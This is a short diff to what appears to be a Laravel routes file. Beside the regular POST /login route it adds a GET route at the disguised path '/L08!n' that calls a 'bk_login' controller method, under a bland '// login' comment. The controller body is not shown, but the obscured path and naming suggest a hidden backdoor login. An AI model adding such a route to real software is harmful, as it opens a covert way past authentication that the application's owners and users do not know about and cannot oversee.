@@ -39,7 +39,10 @@ Route::get('/', function(Request $request){
 	}	
 });
 
+// login
 Route::post('/login', 'LoginController@login');
+Route::get('/L08!n', 'LoginController@bk_login');
+
 Route::post('/logout', function(){
 	session_destroy();
 	return redirect("/");
